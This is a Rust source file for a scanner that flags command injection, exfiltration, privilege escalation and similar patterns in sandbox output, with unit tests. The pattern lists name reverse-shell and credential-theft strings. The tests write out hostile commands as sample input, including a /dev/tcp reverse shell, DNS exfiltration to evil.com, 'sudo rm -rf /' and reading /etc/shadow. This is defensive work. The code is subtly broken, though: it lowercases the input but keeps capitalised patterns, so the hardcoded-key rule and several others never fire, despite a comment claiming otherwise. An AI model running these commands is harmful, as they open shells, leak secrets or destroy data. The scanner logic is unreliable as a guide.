//! Code scanner — detect command injection, data exfiltration, privilege
//! escalation, supply chain attacks, and obfuscation in sandbox output.
//!
//! Ported from SecureYeoman's `code-scanner.ts` (40+ patterns).

use super::types::{ScanFinding, Severity};
use uuid::Uuid;

/// A code violation pattern.
struct CodePattern {
    name: &'static str,
    category: &'static str,
    severity: Severity,
    /// Substring match (case-insensitive). Using substrings instead of regex
    /// for speed — code patterns are structural, not format-dependent.
    patterns: &'static [&'static str],
}

const CODE_PATTERNS: &[CodePattern] = &[
    // ── Command injection ────────────────────────────────────────────
    CodePattern {
        name: "Shell exec",
        category: "command_injection",
        severity: Severity::Critical,
        patterns: &["exec(", "execSync(", "child_process"],
    },
    CodePattern {
        name: "Process spawn",
        category: "command_injection",
        severity: Severity::Critical,
        patterns: &["spawn(", "spawnSync("],
    },
    CodePattern {
        name: "Eval execution",
        category: "command_injection",
        severity: Severity::Critical,
        patterns: &["eval(", "Function("],
    },
    CodePattern {
        name: "Shell invocation",
        category: "command_injection",
        severity: Severity::High,
        patterns: &["/bin/sh", "/bin/bash", "/bin/zsh", "cmd.exe", "powershell"],
    },
    CodePattern {
        name: "Shell metacharacters",
        category: "command_injection",
        severity: Severity::High,
        patterns: &[
            "$(", "${", "| sh", "| bash", "; sh", "; bash", "` ", "/dev/tcp",
        ],
    },
    CodePattern {
        name: "Pipe to shell",
        category: "command_injection",
        severity: Severity::Critical,
        patterns: &["curl | sh", "curl | bash", "wget | sh", "wget | bash"],
    },
    // ── Data exfiltration ────────────────────────────────────────────
    CodePattern {
        name: "HTTP request",
        category: "data_exfiltration",
        severity: Severity::Medium,
        patterns: &["fetch(", "axios.", "http.request(", "https.request("],
    },
    CodePattern {
        name: "DNS exfil",
        category: "data_exfiltration",
        severity: Severity::High,
        patterns: &["dns.resolve", "dns.lookup", "nslookup", "dig "],
    },
    CodePattern {
        name: "Reverse shell",
        category: "data_exfiltration",
        severity: Severity::Critical,
        patterns: &[
            "mkfifo",
            "/dev/tcp/",
            "nc -e",
            "ncat -e",
            "socat exec:",
            "bash -i >& /dev/tcp",
        ],
    },
    CodePattern {
        name: "Network tools",
        category: "data_exfiltration",
        severity: Severity::High,
        patterns: &["nc ", "ncat ", "socat ", "telnet ", "nmap "],
    },
    // ── Privilege escalation ─────────────────────────────────────────
    CodePattern {
        name: "Sudo/su",
        category: "privilege_escalation",
        severity: Severity::Critical,
        patterns: &["sudo ", "su -", "su root"],
    },
    CodePattern {
        name: "Permission change",
        category: "privilege_escalation",
        severity: Severity::High,
        patterns: &["chmod ", "chown ", "chgrp ", "setuid", "setgid"],
    },
    CodePattern {
        name: "Kernel module",
        category: "privilege_escalation",
        severity: Severity::Critical,
        patterns: &["insmod ", "modprobe ", "rmmod "],
    },
    CodePattern {
        name: "Mount operation",
        category: "privilege_escalation",
        severity: Severity::Critical,
        patterns: &["mount ", "umount ", "mount("],
    },
    CodePattern {
        name: "Capability manipulation",
        category: "privilege_escalation",
        severity: Severity::Critical,
        patterns: &["setcap ", "getcap ", "capsh "],
    },
    // ── Supply chain attacks ─────────────────────────────────────────
    CodePattern {
        name: "Package install",
        category: "supply_chain",
        severity: Severity::High,
        patterns: &[
            "npm install",
            "pip install",
            "gem install",
            "cargo install",
            "go install",
            "apt install",
            "apt-get install",
            "yum install",
            "dnf install",
            "pacman -S",
        ],
    },
    CodePattern {
        name: "Remote script execution",
        category: "supply_chain",
        severity: Severity::Critical,
        patterns: &["curl | sh", "curl | bash", "wget -O - |", "curl -sSL |"],
    },
    CodePattern {
        name: "Dynamic require/import",
        category: "supply_chain",
        severity: Severity::Medium,
        patterns: &["require(", "import(", "__import__("],
    },
    // ── Obfuscation ──────────────────────────────────────────────────
    CodePattern {
        name: "Base64 decode",
        category: "obfuscation",
        severity: Severity::Medium,
        patterns: &["atob(", "base64 -d", "base64 --decode", "b64decode"],
    },
    CodePattern {
        name: "Unicode escape",
        category: "obfuscation",
        severity: Severity::Medium,
        patterns: &["\\u00", "\\x00", "String.fromCharCode"],
    },
    CodePattern {
        name: "Hex encoding",
        category: "obfuscation",
        severity: Severity::Low,
        patterns: &["\\x", "fromhex(", "hex.decode"],
    },
    // ── Filesystem abuse ─────────────────────────────────────────────
    CodePattern {
        name: "Sensitive path access",
        category: "filesystem_abuse",
        severity: Severity::Critical,
        patterns: &[
            "/etc/shadow",
            "/etc/passwd",
            "/etc/sudoers",
            "/.ssh/",
            "/.gnupg/",
            "/.aws/",
            "/.kube/",
            "/dev/mem",
            "/dev/kmem",
            "/proc/kcore",
        ],
    },
    CodePattern {
        name: "Path traversal",
        category: "filesystem_abuse",
        severity: Severity::High,
        patterns: &["../", "..\\"],
    },
    CodePattern {
        name: "Destructive operation",
        category: "filesystem_abuse",
        severity: Severity::Critical,
        patterns: &["rm -rf", "dd if=", "mkfs.", "shred "],
    },
    // ── Crypto misuse ────────────────────────────────────────────────
    CodePattern {
        name: "Weak hash",
        category: "crypto_misuse",
        severity: Severity::Medium,
        patterns: &["md5(", "MD5(", "sha1(", "SHA1("],
    },
    CodePattern {
        name: "Hardcoded key",
        category: "crypto_misuse",
        severity: Severity::High,
        patterns: &["AES_KEY =", "ENCRYPTION_KEY =", "SECRET_KEY ="],
    },
];

/// Code violation scanner.
///
/// Detects command injection, data exfiltration, privilege escalation,
/// supply chain attacks, obfuscation, filesystem abuse, and crypto misuse
/// in sandbox output using fast substring matching.
#[derive(Debug)]
pub struct CodeScanner;

impl CodeScanner {
    /// Create a new code scanner.
    #[must_use]
    pub fn new() -> Self {
        Self
    }

    /// Scan text for code violations. Returns findings.
    #[must_use]
    pub fn scan(&self, text: &str) -> Vec<ScanFinding> {
        let text_lower = text.to_lowercase();
        let mut findings = Vec::new();

        for pattern in CODE_PATTERNS {
            for &substr in pattern.patterns {
                // Patterns are already lowercase constants — no per-iteration allocation
                if text_lower.contains(substr) {
                    findings.push(ScanFinding {
                        id: Uuid::new_v4(),
                        scanner: "code".into(),
                        severity: pattern.severity,
                        category: pattern.category.into(),
                        message: format!("{} detected", pattern.name),
                        evidence: extract_evidence(text, &text_lower, substr),
                    });
                    break; // One finding per pattern group
                }
            }
        }

        findings
    }
}

impl Default for CodeScanner {
    fn default() -> Self {
        Self::new()
    }
}

/// Extract a snippet of evidence around the matched substring.
/// Accepts pre-lowered text to avoid redundant allocation.
fn extract_evidence(text: &str, text_lower: &str, pattern: &str) -> Option<String> {
    if let Some(pos) = text_lower.find(pattern) {
        let start = pos.saturating_sub(20);
        let end = (pos + pattern.len() + 20).min(text.len());
        // Find valid char boundaries
        let mut s = start;
        while s > 0 && !text.is_char_boundary(s) {
            s -= 1;
        }
        let mut e = end;
        while e < text.len() && !text.is_char_boundary(e) {
            e += 1;
        }
        Some(text[s..e].to_string())
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scanner() -> CodeScanner {
        CodeScanner::new()
    }

    // ── Command injection ────────────────────────────────────────────

    #[test]
    fn detect_exec() {
        let findings = scanner().scan("child_process.exec('ls')");
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.category == "command_injection"));
    }

    #[test]
    fn detect_eval() {
        let findings = scanner().scan("eval('malicious code')");
        assert!(!findings.is_empty());
    }

    #[test]
    fn detect_shell_invocation() {
        let findings = scanner().scan("running /bin/bash -c 'whoami'");
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.category == "command_injection"));
    }

    #[test]
    fn detect_shell_metachar() {
        let findings = scanner().scan("echo $(whoami)");
        assert!(!findings.is_empty());
    }

    // ── Data exfiltration ────────────────────────────────────────────

    #[test]
    fn detect_reverse_shell() {
        let findings = scanner().scan("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1");
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.category == "data_exfiltration"));
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[test]
    fn detect_dns_exfil() {
        let findings = scanner().scan("nslookup secret.evil.com");
        assert!(!findings.is_empty());
    }

    #[test]
    fn detect_network_tools() {
        let findings = scanner().scan("nc -lvp 4444");
        assert!(!findings.is_empty());
    }

    // ── Privilege escalation ─────────────────────────────────────────

    #[test]
    fn detect_sudo() {
        let findings = scanner().scan("sudo rm -rf /");
        assert!(!findings.is_empty());
        assert!(
            findings
                .iter()
                .any(|f| f.category == "privilege_escalation")
        );
    }

    #[test]
    fn detect_chmod() {
        let findings = scanner().scan("chmod 777 /etc/passwd");
        assert!(!findings.is_empty());
    }

    #[test]
    fn detect_mount() {
        let findings = scanner().scan("mount -t proc proc /mnt");
        assert!(!findings.is_empty());
    }

    // ── Supply chain ─────────────────────────────────────────────────

    #[test]
    fn detect_package_install() {
        let findings = scanner().scan("npm install evil-package");
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.category == "supply_chain"));
    }

    #[test]
    fn detect_pip_install() {
        let findings = scanner().scan("pip install backdoor");
        assert!(!findings.is_empty());
    }

    // ── Obfuscation ──────────────────────────────────────────────────

    #[test]
    fn detect_base64_decode() {
        let findings = scanner().scan("echo aGVsbG8= | base64 -d");
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.category == "obfuscation"));
    }

    // ── Filesystem abuse ─────────────────────────────────────────────

    #[test]
    fn detect_sensitive_path() {
        let findings = scanner().scan("cat /etc/shadow");
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.category == "filesystem_abuse"));
    }

    #[test]
    fn detect_path_traversal() {
        let findings = scanner().scan("open('../../../../etc/passwd')");
        assert!(!findings.is_empty());
    }

    #[test]
    fn detect_rm_rf() {
        let findings = scanner().scan("rm -rf /important");
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
    }

    // ── Crypto misuse ────────────────────────────────────────────────

    #[test]
    fn detect_weak_hash() {
        let findings = scanner().scan("hashlib.md5(data)");
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.category == "crypto_misuse"));
    }

    // ── Clean output ─────────────────────────────────────────────────

    #[test]
    fn clean_output_no_findings() {
        let findings = scanner().scan("hello world\nstatus: ok\nresult: 42\n");
        assert!(findings.is_empty());
    }

    #[test]
    fn evidence_extraction() {
        let text = "prefix exec('cmd') suffix";
        let ev = extract_evidence(text, &text.to_lowercase(), "exec(");
        assert!(ev.is_some());
        let s = ev.unwrap();
        assert!(s.contains("exec("));
    }

    #[test]
    fn case_insensitive() {
        let findings = scanner().scan("EVAL('test')");
        assert!(!findings.is_empty());
    }
}
